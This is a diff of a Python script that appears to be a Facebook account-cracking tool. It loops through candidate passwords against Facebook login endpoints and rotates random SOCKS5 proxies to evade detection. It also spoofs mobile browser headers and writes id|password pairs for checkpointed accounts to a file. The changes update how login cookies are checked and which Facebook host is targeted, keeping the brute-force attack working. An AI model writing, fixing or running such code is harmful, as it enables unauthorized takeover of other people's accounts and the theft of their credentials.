@@ -1102,7 +1102,7 @@ def _async(idf,pwv):
 				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
 			}
             post = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
-            if "checkpoint" in ses.cookies.get_dict().keys():
+            if "checkpoint" in post.cookies.get_dict().keys():
                 print(f' {P}[{K} CP{P}] {K}{idf}|{pw}')
                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                 cp+=1
@@ -1130,7 +1130,7 @@ def metode_api(idf,pwv):
 	for pw in pwv:
 		try:
 			if 'ya' in ualuh: ua = ualu[0]
-			hst = 'iphone.facebook.com'
+			hst = 'mbasic.facebook.com'
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({'Host':hst,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
